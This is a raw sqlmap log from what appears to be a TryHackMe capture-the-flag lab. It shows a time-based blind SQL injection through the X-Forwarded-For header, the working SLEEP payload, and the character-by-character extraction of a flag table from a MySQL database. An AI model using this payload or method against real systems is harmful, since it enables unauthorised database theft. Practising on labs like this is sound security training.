        ___
       __H__                                                                                                        
 ___ ___["]_____ ___ ___  {1.7.8#stable}                                                                            
|_ -| . [.]     | .'| . |                                                                                           
|___|_  [.]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:09:18 /2023-11-07/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[12:09:24] [INFO] testing connection to the target URL
[12:09:24] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:09:25] [INFO] testing if the target URL content is stable
[12:09:25] [INFO] target URL content is stable
[12:09:25] [INFO] testing if (custom) HEADER parameter 'X-forwarded-for #1*' is dynamic
[12:09:25] [WARNING] (custom) HEADER parameter 'X-forwarded-for #1*' does not appear to be dynamic
[12:09:25] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter 'X-forwarded-for #1*' might not be injectable
[12:09:25] [INFO] testing for SQL injection on (custom) HEADER parameter 'X-forwarded-for #1*'
[12:09:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:09:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:09:27] [INFO] testing 'Generic inline queries'
[12:09:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:09:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:09:28] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)    
[12:09:45] [INFO] (custom) HEADER parameter 'X-forwarded-for #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                                         
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:09:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:09:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:09:59] [INFO] checking if the injection point on (custom) HEADER parameter 'X-forwarded-for #1*' is a false positive
(custom) HEADER parameter 'X-forwarded-for #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: X-forwarded-for #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1' AND (SELECT 3869 FROM (SELECT(SLEEP(5)))heSO) AND 'VzvZ'='VzvZ
---
[12:10:27] [INFO] the back-end DBMS is MySQL
[12:10:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[12:10:29] [INFO] fetching columns for table 'flag' in database 'sqhell_1'
[12:10:29] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[12:10:50] [INFO] retrieved: 
[12:10:55] [INFO] adjusting time delay to 3 seconds due to good response times
flag
[12:11:37] [INFO] retrieved: id
[12:12:01] [INFO] fetching entries for table 'flag' in database 'sqhell_1'
[12:12:01] [INFO] fetching number of entries for table 'flag' in database 'sqhell_1'
[12:12:01] [INFO] retrieved: 1
[12:12:06] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[12:12:23] [INFO] adjusting time delay to 2 seconds due to good response times
T
[12:12:33] [ERROR] invalid character detected. retrying..
[12:12:33] [WARNING] increasing time delay to 3 seconds
HM{
[12:13:26] [ERROR] invalid character detected. retrying..
[12:13:26] [WARNING] increasing time delay to 4 seconds
FL
[12:14:09] [ERROR] invalid character detected. retrying..
[12:14:09] [WARNING] increasing time delay to 5 seconds
AG2:C678A
[12:16:51] [ERROR] invalid character detected. retrying..
[12:16:51] [WARNING] increasing time delay to 6 seconds
BFE
[12:18:02] [ERROR] invalid character detected. retrying..
[12:18:02] [WARNING] increasing time delay to 7 seconds
1C01F
[12:20:36] [ERROR] invalid character detected. retrying..
[12:20:36] [WARNING] increasing time delay to 8 seconds
[12:20:56] [ERROR] invalid character detected. retrying..
[12:20:56] [WARNING] increasing time delay to 9 seconds
[12:21:17] [ERROR] invalid character detected. retrying..
[12:21:17] [WARNING] increasing time delay to 10 seconds
[12:21:44] [ERROR] invalid character detected. retrying..
[12:21:44] [WARNING] increasing time delay to 11 seconds
CA
[12:22:36] [ERROR] invalid character detected. retrying..
[12:22:36] [WARNING] increasing time delay to 12 seconds
19E
[12:24:58] [ERROR] invalid character detected. retrying..
[12:24:58] [WARNING] increasing time delay to 13 seconds
03
[12:27:19] [ERROR] invalid character detected. retrying..
[12:27:19] [WARNING] increasing time delay to 14 seconds
[12:27:51] [ERROR] invalid character detected. retrying..
[12:27:51] [WARNING] increasing time delay to 15 seconds
9
[12:29:42] [ERROR] invalid character detected. retrying..
[12:29:42] [WARNING] increasing time delay to 16 seconds
01C
[12:32:48] [ERROR] invalid character detected. retrying..
[12:32:48] [WARNING] increasing time delay to 17 seconds
E
[12:34:04] [ERROR] invalid character detected. retrying..
[12:34:04] [WARNING] increasing time delay to 18 seconds
DAB1D
[12:38:15] [ERROR] invalid character detected. retrying..
[12:38:15] [WARNING] increasing time delay to 19 seconds
1
[12:39:55] [ERROR] invalid character detected. retrying..
[12:39:55] [WARNING] increasing time delay to 20 seconds
[12:40:39] [ERROR] invalid character detected. retrying..
[12:40:39] [WARNING] increasing time delay to 21 seconds
5}
[12:43:52] [INFO] retrieved: 1
Database: sqhell_1
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15} |
+----+---------------------------------------------+

[12:44:36] [INFO] table 'sqhell_1.flag' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.46.216/dump/sqhell_1/flag.csv'                                                                                                  
[12:44:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.46.216'

[*] ending @ 12:44:36 /2023-11-07/

